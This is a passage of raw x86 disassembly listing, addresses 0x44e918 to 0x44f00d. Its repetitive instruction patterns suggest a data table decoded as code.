  44e918:	or     ecx,DWORD PTR [eax+eax*1]
  44e91b:	nop
  44e91c:	or     ecx,DWORD PTR [eax+eax*1]
  44e91f:	nop
  44e920:	or     ecx,DWORD PTR [eax+eax*1]
  44e923:	nop
  44e924:	or     ecx,DWORD PTR [eax+eax*1]
  44e927:	nop
  44e928:	or     ecx,DWORD PTR [eax+eax*1]
  44e92b:	nop
  44e92c:	or     ecx,DWORD PTR [eax+eax*1]
  44e92f:	nop
  44e930:	or     ecx,DWORD PTR [eax+eax*1]
  44e933:	nop
  44e934:	or     ecx,DWORD PTR [eax+eax*1]
  44e937:	add    BYTE PTR [eax],al
  44e939:	add    BYTE PTR [eax],al
  44e93b:	add    BYTE PTR [eax-0x6ffff3f5],dl
  44e941:	or     ecx,DWORD PTR [eax+eax*1]
  44e944:	nop
  44e945:	or     ecx,DWORD PTR [eax+eax*1]
  44e948:	nop
  44e949:	or     ecx,DWORD PTR [eax+eax*1]
  44e94c:	nop
  44e94d:	or     ecx,DWORD PTR [eax+eax*1]
  44e950:	nop
  44e951:	or     ecx,DWORD PTR [eax+eax*1]
  44e954:	nop
  44e955:	or     ecx,DWORD PTR [eax+eax*1]
  44e958:	nop
  44e959:	or     ecx,DWORD PTR [eax+eax*1]
  44e95c:	nop
  44e95d:	or     ecx,DWORD PTR [eax+eax*1]
  44e960:	nop
  44e961:	or     ecx,DWORD PTR [eax+eax*1]
  44e964:	nop
  44e965:	mov    dl,0xf5
  44e967:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e96d:	mov    dl,0xf5
  44e96f:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e975:	mov    dl,0xf5
  44e977:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e97d:	mov    dl,0xf5
  44e97f:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e985:	mov    dl,0xf5
  44e987:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e98d:	mov    dl,0xf5
  44e98f:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e995:	mov    dl,0xf5
  44e997:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e99d:	mov    dl,0xf5
  44e99f:	add    eax,DWORD PTR [eax]
  44e9a1:	add    BYTE PTR [eax],al
  44e9a3:	add    BYTE PTR [eax],al
  44e9a5:	nop
  44e9a6:	mov    dl,0xf5
  44e9a8:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e9ae:	mov    dl,0xf5
  44e9b0:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e9b6:	mov    dl,0xf5
  44e9b8:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e9be:	mov    dl,0xf5
  44e9c0:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e9c6:	mov    dl,0xf5
  44e9c8:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e9ce:	mov    dl,0xf5
  44e9d0:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e9d6:	mov    dl,0xf5
  44e9d8:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e9de:	mov    dl,0xf5
  44e9e0:	add    edx,DWORD PTR [eax-0x6c16f14e]
  44e9e6:	mov    dl,0xe
  44e9e8:	jmp    0xe9539c80
  44e9ed:	xchg   ebx,eax
  44e9ee:	mov    dl,0xe
  44e9f0:	jmp    0xe9539c88
  44e9f5:	xchg   ebx,eax
  44e9f6:	mov    dl,0xe
  44e9f8:	jmp    0xe9539c90
  44e9fd:	xchg   ebx,eax
  44e9fe:	mov    dl,0xe
  44ea00:	jmp    0xe9539c98
  44ea05:	xchg   ebx,eax
  44ea06:	mov    dl,0xe
  44ea08:	jmp    0x44ea0d
  44ea0d:	add    BYTE PTR [ebx-0x6c16f14e],dl
  44ea13:	mov    dl,0xe
  44ea15:	jmp    0xe9539cad
  44ea1a:	xchg   ebx,eax
  44ea1b:	mov    dl,0xe
  44ea1d:	jmp    0xe9539cb5
  44ea22:	xchg   ebx,eax
  44ea23:	mov    dl,0xe
  44ea25:	jmp    0xe9539cbd
  44ea2a:	xchg   ebx,eax
  44ea2b:	mov    dl,0xe
  44ea2d:	jmp    0xe9539cc5
  44ea32:	xchg   ebx,eax
  44ea33:	mov    dl,0xe
  44ea35:	jmp    0xe9539ccd
  44ea3a:	xchg   ebx,eax
  44ea3b:	mov    dl,0xe
  44ea3d:	jmp    0xe9539cd5
  44ea42:	xchg   ebx,eax
  44ea43:	mov    dl,0xe
  44ea45:	jmp    0xe9539cdd
  44ea4a:	xchg   ebx,eax
  44ea4b:	mov    dl,0xe
  44ea4d:	jmp    0xe9539ce5
  44ea52:	xchg   ebx,eax
  44ea53:	mov    dl,0xe
  44ea55:	jmp    0xe9539ced
  44ea5a:	xchg   ebx,eax
  44ea5b:	mov    dl,0xe
  44ea5d:	jmp    0x539cf5
  44ea62:	mov    ecx,0xa9000eaf
  44ea67:	scas   eax,DWORD PTR es:[edi]
  44ea68:	push   cs
  44ea69:	add    BYTE PTR [ecx+0x79000eaf],ch
  44ea6f:	scas   eax,DWORD PTR es:[edi]
  44ea70:	push   cs
  44ea71:	add    BYTE PTR [eax],al
  44ea73:	add    BYTE PTR [eax],al
  44ea75:	add    BYTE PTR [eax],al
  44ea77:	jns    0x44ea28
  44ea79:	push   cs
  44ea7a:	add    BYTE PTR [ecx-0x51],ch
  44ea7d:	push   cs
  44ea7e:	add    BYTE PTR [ecx-0x51],ch
  44ea81:	push   cs
  44ea82:	add    BYTE PTR [ecx-0x51],bh
  44ea85:	push   cs
  44ea86:	add    BYTE PTR [ecx-0x51],bh
  44ea89:	push   cs
  44ea8a:	add    BYTE PTR [ecx-0x51],ch
  44ea8d:	push   cs
  44ea8e:	add    BYTE PTR [ecx-0x51],ch
  44ea91:	push   cs
  44ea92:	add    BYTE PTR [ecx],bh
  44ea94:	scas   eax,DWORD PTR es:[edi]
  44ea95:	push   cs
  44ea96:	add    BYTE PTR [ecx],bh
  44ea98:	scas   eax,DWORD PTR es:[edi]
  44ea99:	push   cs
  44ea9a:	add    BYTE PTR [ecx],ch
  44ea9c:	scas   eax,DWORD PTR es:[edi]
  44ea9d:	push   cs
  44ea9e:	add    BYTE PTR [ecx],ch
  44eaa0:	scas   eax,DWORD PTR es:[edi]
  44eaa1:	push   cs
  44eaa2:	add    BYTE PTR [ecx],bh
  44eaa4:	scas   eax,DWORD PTR es:[edi]
  44eaa5:	push   cs
  44eaa6:	add    BYTE PTR [ecx],bh
  44eaa8:	scas   eax,DWORD PTR es:[edi]
  44eaa9:	push   cs
  44eaaa:	add    BYTE PTR [ecx],ch
  44eaac:	scas   eax,DWORD PTR es:[edi]
  44eaad:	push   cs
  44eaae:	add    BYTE PTR [ecx],ch
  44eab0:	scas   eax,DWORD PTR es:[edi]
  44eab1:	push   cs
  44eab2:	add    cl,bh
  44eab4:	scas   al,BYTE PTR es:[edi]
  44eab5:	push   cs
  44eab6:	add    cl,bh
  44eab8:	scas   al,BYTE PTR es:[edi]
  44eab9:	push   cs
  44eaba:	add    cl,ch
  44eabc:	scas   al,BYTE PTR es:[edi]
  44eabd:	push   cs
  44eabe:	add    cl,ch
  44eac0:	scas   al,BYTE PTR es:[edi]
  44eac1:	push   cs
  44eac2:	add    cl,bh
  44eac4:	scas   al,BYTE PTR es:[edi]
  44eac5:	push   cs
  44eac6:	add    cl,bh
  44eac8:	scas   al,BYTE PTR es:[edi]
  44eac9:	push   cs
  44eaca:	add    cl,ch
  44eacc:	scas   al,BYTE PTR es:[edi]
  44eacd:	push   cs
  44eace:	add    cl,ch
  44ead0:	scas   al,BYTE PTR es:[edi]
  44ead1:	push   cs
  44ead2:	add    BYTE PTR [ecx-0x46fff152],bh
  44ead8:	scas   al,BYTE PTR es:[edi]
  44ead9:	push   cs
  44eada:	add    BYTE PTR [eax],al
  44eadc:	add    BYTE PTR [eax],al
  44eade:	add    BYTE PTR [eax],al
  44eae0:	test   eax,0x90000eae
  44eae5:	or     DWORD PTR [eax+eax*1],ecx
  44eae8:	nop
  44eae9:	or     DWORD PTR [eax+eax*1],ecx
  44eaec:	nop
  44eaed:	or     DWORD PTR [eax+eax*1],ecx
  44eaf0:	nop
  44eaf1:	or     DWORD PTR [eax+eax*1],ecx
  44eaf4:	nop
  44eaf5:	or     DWORD PTR [eax+eax*1],ecx
  44eaf8:	nop
  44eaf9:	or     ecx,DWORD PTR [eax+eax*1]
  44eafc:	nop
  44eafd:	or     ecx,DWORD PTR [eax+eax*1]
  44eb00:	nop
  44eb01:	or     ecx,DWORD PTR [eax+eax*1]
  44eb04:	nop
  44eb05:	or     ecx,DWORD PTR [eax+eax*1]
  44eb08:	nop
  44eb09:	or     ecx,DWORD PTR [eax+eax*1]
  44eb0c:	nop
  44eb0d:	or     ecx,DWORD PTR [eax+eax*1]
  44eb10:	nop
  44eb11:	or     ecx,DWORD PTR [eax+eax*1]
  44eb14:	nop
  44eb15:	or     ecx,DWORD PTR [eax+eax*1]
  44eb18:	nop
  44eb19:	or     ecx,DWORD PTR [eax+eax*1]
  44eb1c:	nop
  44eb1d:	or     ecx,DWORD PTR [eax+eax*1]
  44eb20:	nop
  44eb21:	or     ecx,DWORD PTR [eax+eax*1]
  44eb24:	nop
  44eb25:	or     ecx,DWORD PTR [eax+eax*1]
  44eb28:	nop
  44eb29:	or     ecx,DWORD PTR [eax+eax*1]
  44eb2c:	nop
  44eb2d:	or     ecx,DWORD PTR [eax+eax*1]
  44eb30:	nop
  44eb31:	or     ecx,DWORD PTR [eax+eax*1]
  44eb34:	nop
  44eb35:	or     ecx,DWORD PTR [eax+eax*1]
  44eb38:	nop
  44eb39:	or     ecx,DWORD PTR [eax+eax*1]
  44eb3c:	nop
  44eb3d:	or     ecx,DWORD PTR [eax+eax*1]
  44eb40:	nop
  44eb41:	or     ecx,DWORD PTR [eax+eax*1]
  44eb44:	add    BYTE PTR [eax],al
  44eb46:	add    BYTE PTR [eax],al
  44eb48:	add    BYTE PTR [eax-0x6ffff3f5],dl
  44eb4e:	or     ecx,DWORD PTR [eax+eax*1]
  44eb51:	nop
  44eb52:	or     ecx,DWORD PTR [eax+eax*1]
  44eb55:	nop
  44eb56:	or     ecx,DWORD PTR [eax+eax*1]
  44eb59:	nop
  44eb5a:	or     ecx,DWORD PTR [eax+eax*1]
  44eb5d:	nop
  44eb5e:	or     ecx,DWORD PTR [eax+eax*1]
  44eb61:	nop
  44eb62:	mov    dl,0xf5
  44eb64:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44eb6a:	mov    dl,0xf5
  44eb6c:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44eb72:	mov    dl,0xf5
  44eb74:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44eb7a:	mov    dl,0xf5
  44eb7c:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44eb82:	mov    dl,0xf5
  44eb84:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44eb8a:	mov    dl,0xf5
  44eb8c:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44eb92:	mov    dl,0xf5
  44eb94:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44eb9a:	mov    dl,0xf5
  44eb9c:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44eba2:	mov    dl,0xf5
  44eba4:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44ebaa:	mov    dl,0xf5
  44ebac:	add    eax,DWORD PTR [eax]
  44ebae:	add    BYTE PTR [eax],al
  44ebb0:	add    BYTE PTR [eax],al
  44ebb2:	nop
  44ebb3:	mov    dl,0xf5
  44ebb5:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44ebbb:	mov    dl,0xf5
  44ebbd:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44ebc3:	mov    dl,0xf5
  44ebc5:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44ebcb:	mov    dl,0xf5
  44ebcd:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44ebd3:	mov    dl,0xf5
  44ebd5:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44ebdb:	mov    dl,0xf5
  44ebdd:	add    edx,DWORD PTR [eax-0x6c16f14e]
  44ebe3:	mov    dl,0xe
  44ebe5:	jmp    0xe9539e7d
  44ebea:	xchg   ebx,eax
  44ebeb:	mov    dl,0xe
  44ebed:	jmp    0xe9539e85
  44ebf2:	xchg   ebx,eax
  44ebf3:	mov    dl,0xe
  44ebf5:	jmp    0xe9539e8d
  44ebfa:	xchg   ebx,eax
  44ebfb:	mov    dl,0xe
  44ebfd:	jmp    0xe9539e95
  44ec02:	xchg   ebx,eax
  44ec03:	mov    dl,0xe
  44ec05:	jmp    0xe9539e9d
  44ec0a:	xchg   ebx,eax
  44ec0b:	mov    dl,0xe
  44ec0d:	jmp    0xe9539ea5
  44ec12:	xchg   ebx,eax
  44ec13:	mov    dl,0xe
  44ec15:	jmp    0x44ec1a
  44ec1a:	add    BYTE PTR [ebx-0x6c16f14e],dl
  44ec20:	mov    dl,0xe
  44ec22:	jmp    0xe9539eba
  44ec27:	xchg   ebx,eax
  44ec28:	mov    dl,0xe
  44ec2a:	jmp    0xe9539ec2
  44ec2f:	xchg   ebx,eax
  44ec30:	mov    dl,0xe
  44ec32:	jmp    0xe9539eca
  44ec37:	xchg   ebx,eax
  44ec38:	mov    dl,0xe
  44ec3a:	jmp    0xe9539ed2
  44ec3f:	xchg   ebx,eax
  44ec40:	mov    dl,0xe
  44ec42:	jmp    0xe9539eda
  44ec47:	xchg   ebx,eax
  44ec48:	mov    dl,0xe
  44ec4a:	jmp    0xe9539ee2
  44ec4f:	xchg   ebx,eax
  44ec50:	mov    dl,0xe
  44ec52:	jmp    0xe9539eea
  44ec57:	xchg   ebx,eax
  44ec58:	mov    dl,0xe
  44ec5a:	jmp    0x539ef2
  44ec5f:	jmp    0xe944fb17
  44ec64:	mov    bl,0xe
  44ec66:	add    BYTE PTR [ecx-0x46fff14d],bh
  44ec6c:	mov    bl,0xe
  44ec6e:	add    BYTE PTR [ecx-0x56fff14d],ch
  44ec74:	mov    bl,0xe
  44ec76:	add    BYTE PTR [ecx-0x46fff14d],bh
  44ec7c:	mov    bl,0xe
  44ec7e:	add    BYTE PTR [eax],al
  44ec80:	add    BYTE PTR [eax],al
  44ec82:	add    BYTE PTR [eax],al
  44ec84:	test   eax,0xa9000eb3
  44ec89:	mov    bl,0xe
  44ec8b:	add    BYTE PTR [ecx-0x4d],bh
  44ec8e:	push   cs
  44ec8f:	add    BYTE PTR [ecx-0x4d],bh
  44ec92:	push   cs
  44ec93:	add    BYTE PTR [ecx-0x4d],ch
  44ec96:	push   cs
  44ec97:	add    BYTE PTR [ecx-0x4d],ch
  44ec9a:	push   cs
  44ec9b:	add    BYTE PTR [ecx-0x4d],bh
  44ec9e:	push   cs
  44ec9f:	add    BYTE PTR [ecx-0x4d],bh
  44eca2:	push   cs
  44eca3:	add    BYTE PTR [ecx-0x4d],ch
  44eca6:	push   cs
  44eca7:	add    BYTE PTR [ecx-0x4d],ch
  44ecaa:	push   cs
  44ecab:	add    BYTE PTR [ecx],bh
  44ecad:	mov    bl,0xe
  44ecaf:	add    BYTE PTR [ecx],bh
  44ecb1:	mov    bl,0xe
  44ecb3:	add    BYTE PTR [ecx],ch
  44ecb5:	mov    bl,0xe
  44ecb7:	add    BYTE PTR [ecx],ch
  44ecb9:	mov    bl,0xe
  44ecbb:	add    BYTE PTR [ecx],bh
  44ecbd:	mov    bl,0xe
  44ecbf:	add    BYTE PTR [ecx],bh
  44ecc1:	mov    bl,0xe
  44ecc3:	add    BYTE PTR [ecx],ch
  44ecc5:	mov    bl,0xe
  44ecc7:	add    BYTE PTR [ecx],ch
  44ecc9:	mov    bl,0xe
  44eccb:	add    cl,bh
  44eccd:	mov    dl,0xe
  44eccf:	add    cl,bh
  44ecd1:	mov    dl,0xe
  44ecd3:	add    cl,ch
  44ecd5:	mov    dl,0xe
  44ecd7:	add    cl,ch
  44ecd9:	mov    dl,0xe
  44ecdb:	add    BYTE PTR [eax-0x6ffff3f7],dl
  44ece1:	or     DWORD PTR [eax+eax*1],ecx
  44ece4:	nop
  44ece5:	or     DWORD PTR [eax+eax*1],ecx
  44ece8:	add    BYTE PTR [eax],al
  44ecea:	add    BYTE PTR [eax],al
  44ecec:	add    BYTE PTR [eax-0x6ffff3f7],dl
  44ecf2:	or     DWORD PTR [eax+eax*1],ecx
  44ecf5:	nop
  44ecf6:	or     DWORD PTR [eax+eax*1],ecx
  44ecf9:	nop
  44ecfa:	or     DWORD PTR [eax+eax*1],ecx
  44ecfd:	nop
  44ecfe:	or     DWORD PTR [eax+eax*1],ecx
  44ed01:	nop
  44ed02:	or     DWORD PTR [eax+eax*1],ecx
  44ed05:	nop
  44ed06:	or     DWORD PTR [eax+eax*1],ecx
  44ed09:	nop
  44ed0a:	or     DWORD PTR [eax+eax*1],ecx
  44ed0d:	nop
  44ed0e:	or     DWORD PTR [eax+eax*1],ecx
  44ed11:	nop
  44ed12:	or     ecx,DWORD PTR [eax+eax*1]
  44ed15:	nop
  44ed16:	or     ecx,DWORD PTR [eax+eax*1]
  44ed19:	nop
  44ed1a:	or     ecx,DWORD PTR [eax+eax*1]
  44ed1d:	nop
  44ed1e:	or     ecx,DWORD PTR [eax+eax*1]
  44ed21:	nop
  44ed22:	or     ecx,DWORD PTR [eax+eax*1]
  44ed25:	nop
  44ed26:	or     ecx,DWORD PTR [eax+eax*1]
  44ed29:	nop
  44ed2a:	or     ecx,DWORD PTR [eax+eax*1]
  44ed2d:	nop
  44ed2e:	or     ecx,DWORD PTR [eax+eax*1]
  44ed31:	nop
  44ed32:	or     ecx,DWORD PTR [eax+eax*1]
  44ed35:	nop
  44ed36:	or     ecx,DWORD PTR [eax+eax*1]
  44ed39:	nop
  44ed3a:	or     ecx,DWORD PTR [eax+eax*1]
  44ed3d:	nop
  44ed3e:	or     ecx,DWORD PTR [eax+eax*1]
  44ed41:	nop
  44ed42:	or     ecx,DWORD PTR [eax+eax*1]
  44ed45:	nop
  44ed46:	or     ecx,DWORD PTR [eax+eax*1]
  44ed49:	nop
  44ed4a:	or     ecx,DWORD PTR [eax+eax*1]
  44ed4d:	nop
  44ed4e:	or     ecx,DWORD PTR [eax+eax*1]
  44ed51:	add    BYTE PTR [eax],al
  44ed53:	add    BYTE PTR [eax],al
  44ed55:	add    BYTE PTR [eax-0x6ffff3f5],dl
  44ed5b:	or     ecx,DWORD PTR [eax+eax*1]
  44ed5e:	nop
  44ed5f:	mov    dl,0xf5
  44ed61:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44ed67:	mov    dl,0xf5
  44ed69:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44ed6f:	mov    dl,0xf5
  44ed71:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44ed77:	mov    dl,0xf5
  44ed79:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44ed7f:	mov    dl,0xf5
  44ed81:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44ed87:	mov    dl,0xf5
  44ed89:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44ed8f:	mov    dl,0xf5
  44ed91:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44ed97:	mov    dl,0xf5
  44ed99:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44ed9f:	mov    dl,0xf5
  44eda1:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44eda7:	mov    dl,0xf5
  44eda9:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44edaf:	mov    dl,0xf5
  44edb1:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44edb7:	mov    dl,0xf5
  44edb9:	add    eax,DWORD PTR [eax]
  44edbb:	add    BYTE PTR [eax],al
  44edbd:	add    BYTE PTR [eax],al
  44edbf:	nop
  44edc0:	mov    dl,0xf5
  44edc2:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44edc8:	mov    dl,0xf5
  44edca:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44edd0:	mov    dl,0xf5
  44edd2:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44edd8:	mov    dl,0xf5
  44edda:	add    edx,DWORD PTR [eax-0x6c16f14e]
  44ede0:	mov    dl,0xe
  44ede2:	jmp    0xe953a07a
  44ede7:	xchg   ebx,eax
  44ede8:	mov    dl,0xe
  44edea:	jmp    0xe953a082
  44edef:	xchg   ebx,eax
  44edf0:	mov    dl,0xe
  44edf2:	jmp    0xe953a08a
  44edf7:	xchg   ebx,eax
  44edf8:	mov    dl,0xe
  44edfa:	jmp    0xe953a092
  44edff:	xchg   ebx,eax
  44ee00:	mov    dl,0xe
  44ee02:	jmp    0xe953a09a
  44ee07:	xchg   ebx,eax
  44ee08:	mov    dl,0xe
  44ee0a:	jmp    0xe953a0a2
  44ee0f:	xchg   ebx,eax
  44ee10:	mov    dl,0xe
  44ee12:	jmp    0xe953a0aa
  44ee17:	xchg   ebx,eax
  44ee18:	mov    dl,0xe
  44ee1a:	jmp    0xe953a0b2
  44ee1f:	xchg   ebx,eax
  44ee20:	mov    dl,0xe
  44ee22:	jmp    0x44ee27
  44ee27:	add    BYTE PTR [ebx-0x6c16f14e],dl
  44ee2d:	mov    dl,0xe
  44ee2f:	jmp    0xe953a0c7
  44ee34:	xchg   ebx,eax
  44ee35:	mov    dl,0xe
  44ee37:	jmp    0xe953a0cf
  44ee3c:	xchg   ebx,eax
  44ee3d:	mov    dl,0xe
  44ee3f:	jmp    0xe953a0d7
  44ee44:	xchg   ebx,eax
  44ee45:	mov    dl,0xe
  44ee47:	jmp    0xe953a0df
  44ee4c:	xchg   ebx,eax
  44ee4d:	mov    dl,0xe
  44ee4f:	jmp    0xe953a0e7
  44ee54:	xchg   ebx,eax
  44ee55:	mov    dl,0xe
  44ee57:	jmp    0x53a0ef
  44ee5c:	sub    DWORD PTR [eax-0x5006fff2],esi
  44ee62:	push   cs
  44ee63:	add    cl,bh
  44ee65:	scas   eax,DWORD PTR es:[edi]
  44ee66:	push   cs
  44ee67:	add    cl,ch
  44ee69:	scas   eax,DWORD PTR es:[edi]
  44ee6a:	push   cs
  44ee6b:	add    cl,ch
  44ee6d:	scas   eax,DWORD PTR es:[edi]
  44ee6e:	push   cs
  44ee6f:	add    cl,bh
  44ee71:	scas   eax,DWORD PTR es:[edi]
  44ee72:	push   cs
  44ee73:	add    cl,bh
  44ee75:	scas   eax,DWORD PTR es:[edi]
  44ee76:	push   cs
  44ee77:	add    cl,ch
  44ee79:	scas   eax,DWORD PTR es:[edi]
  44ee7a:	push   cs
  44ee7b:	add    cl,ch
  44ee7d:	scas   eax,DWORD PTR es:[edi]
  44ee7e:	push   cs
  44ee7f:	add    BYTE PTR [ecx-0x46fff151],bh
  44ee85:	scas   eax,DWORD PTR es:[edi]
  44ee86:	push   cs
  44ee87:	add    BYTE PTR [ecx+0xeaf],ch
  44ee8d:	add    BYTE PTR [eax],al
  44ee8f:	add    BYTE PTR [eax],al
  44ee91:	test   eax,0xb9000eaf
  44ee96:	scas   eax,DWORD PTR es:[edi]
  44ee97:	push   cs
  44ee98:	add    BYTE PTR [ecx-0x56fff151],bh
  44ee9e:	scas   eax,DWORD PTR es:[edi]
  44ee9f:	push   cs
  44eea0:	add    BYTE PTR [ecx+0x79000eaf],ch
  44eea6:	scas   eax,DWORD PTR es:[edi]
  44eea7:	push   cs
  44eea8:	add    BYTE PTR [ecx-0x51],bh
  44eeab:	push   cs
  44eeac:	add    BYTE PTR [ecx-0x51],ch
  44eeaf:	push   cs
  44eeb0:	add    BYTE PTR [ecx-0x51],ch
  44eeb3:	push   cs
  44eeb4:	add    BYTE PTR [ecx-0x51],bh
  44eeb7:	push   cs
  44eeb8:	add    BYTE PTR [ecx-0x51],bh
  44eebb:	push   cs
  44eebc:	add    BYTE PTR [ecx-0x51],ch
  44eebf:	push   cs
  44eec0:	add    BYTE PTR [ecx-0x51],ch
  44eec3:	push   cs
  44eec4:	add    BYTE PTR [ecx],bh
  44eec6:	scas   eax,DWORD PTR es:[edi]
  44eec7:	push   cs
  44eec8:	add    BYTE PTR [ecx],bh
  44eeca:	scas   eax,DWORD PTR es:[edi]
  44eecb:	push   cs
  44eecc:	add    BYTE PTR [ecx],ch
  44eece:	scas   eax,DWORD PTR es:[edi]
  44eecf:	push   cs
  44eed0:	add    BYTE PTR [ecx],ch
  44eed2:	scas   eax,DWORD PTR es:[edi]
  44eed3:	push   cs
  44eed4:	add    BYTE PTR [ecx],bh
  44eed6:	scas   eax,DWORD PTR es:[edi]
  44eed7:	push   cs
  44eed8:	add    BYTE PTR [eax-0x6ffff3f7],dl
  44eede:	or     DWORD PTR [eax+eax*1],ecx
  44eee1:	nop
  44eee2:	or     DWORD PTR [eax+eax*1],ecx
  44eee5:	nop
  44eee6:	or     DWORD PTR [eax+eax*1],ecx
  44eee9:	nop
  44eeea:	or     DWORD PTR [eax+eax*1],ecx
  44eeed:	nop
  44eeee:	or     DWORD PTR [eax+eax*1],ecx
  44eef1:	nop
  44eef2:	or     DWORD PTR [eax+eax*1],ecx
  44eef5:	add    BYTE PTR [eax],al
  44eef7:	add    BYTE PTR [eax],al
  44eef9:	add    BYTE PTR [eax-0x6ffff3f7],dl
  44eeff:	or     DWORD PTR [eax+eax*1],ecx
  44ef02:	nop
  44ef03:	or     DWORD PTR [eax+eax*1],ecx
  44ef06:	nop
  44ef07:	or     DWORD PTR [eax+eax*1],ecx
  44ef0a:	nop
  44ef0b:	or     DWORD PTR [eax+eax*1],ecx
  44ef0e:	nop
  44ef0f:	or     DWORD PTR [eax+eax*1],ecx
  44ef12:	nop
  44ef13:	or     DWORD PTR [eax+eax*1],ecx
  44ef16:	nop
  44ef17:	or     DWORD PTR [eax+eax*1],ecx
  44ef1a:	nop
  44ef1b:	or     DWORD PTR [eax+eax*1],ecx
  44ef1e:	nop
  44ef1f:	or     DWORD PTR [eax+eax*1],ecx
  44ef22:	nop
  44ef23:	or     DWORD PTR [eax+eax*1],ecx
  44ef26:	nop
  44ef27:	or     DWORD PTR [eax+eax*1],ecx
  44ef2a:	nop
  44ef2b:	sbb    ecx,DWORD PTR [eax+eax*1]
  44ef2e:	nop
  44ef2f:	sbb    ecx,DWORD PTR [eax+eax*1]
  44ef32:	nop
  44ef33:	sbb    ecx,DWORD PTR [eax+eax*1]
  44ef36:	nop
  44ef37:	sbb    ecx,DWORD PTR [eax+eax*1]
  44ef3a:	nop
  44ef3b:	sbb    ecx,DWORD PTR [eax+eax*1]
  44ef3e:	nop
  44ef3f:	sbb    ecx,DWORD PTR [eax+eax*1]
  44ef42:	nop
  44ef43:	sbb    ecx,DWORD PTR [eax+eax*1]
  44ef46:	nop
  44ef47:	sbb    ecx,DWORD PTR [eax+eax*1]
  44ef4a:	nop
  44ef4b:	sbb    ecx,DWORD PTR [eax+eax*1]
  44ef4e:	nop
  44ef4f:	sbb    ecx,DWORD PTR [eax+eax*1]
  44ef52:	nop
  44ef53:	sbb    ecx,DWORD PTR [eax+eax*1]
  44ef56:	nop
  44ef57:	mov    dl,0xf5
  44ef59:	add    edx,DWORD PTR [eax+0x3f5b2]
  44ef5f:	add    BYTE PTR [eax],al
  44ef61:	add    BYTE PTR [eax],al
  44ef63:	nop
  44ef64:	mov    dl,0xf5
  44ef66:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44ef6c:	mov    dl,0xf5
  44ef6e:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44ef74:	mov    dl,0xf5
  44ef76:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44ef7c:	mov    dl,0xf5
  44ef7e:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44ef84:	mov    dl,0xf5
  44ef86:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44ef8c:	mov    dl,0xf5
  44ef8e:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44ef94:	mov    dl,0xf5
  44ef96:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44ef9c:	mov    dl,0xf5
  44ef9e:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44efa4:	mov    dl,0xf5
  44efa6:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44efac:	mov    dl,0xf5
  44efae:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44efb4:	mov    dl,0xf5
  44efb6:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44efbc:	mov    dl,0xf5
  44efbe:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44efc4:	mov    dl,0xf5
  44efc6:	add    eax,DWORD PTR [eax]
  44efc8:	add    BYTE PTR [eax],al
  44efca:	add    BYTE PTR [eax],al
  44efcc:	nop
  44efcd:	mov    dl,0xf5
  44efcf:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44efd5:	mov    dl,0xf5
  44efd7:	add    edx,DWORD PTR [eax-0x6c16f14e]
  44efdd:	mov    dl,0xe
  44efdf:	jmp    0xe953a277
  44efe4:	xchg   ebx,eax
  44efe5:	mov    dl,0xe
  44efe7:	jmp    0xe953a27f
  44efec:	xchg   ebx,eax
  44efed:	mov    dl,0xe
  44efef:	jmp    0xe953a287
  44eff4:	xchg   ebx,eax
  44eff5:	mov    dl,0xe
  44eff7:	jmp    0xe953a28f
  44effc:	xchg   ebx,eax
  44effd:	mov    dl,0xe
  44efff:	jmp    0xe953a297
  44f004:	xchg   ebx,eax
  44f005:	mov    dl,0xe
  44f007:	jmp    0xe953a29f
  44f00c:	xchg   ebx,eax
  44f00d:	mov    dl,0xe
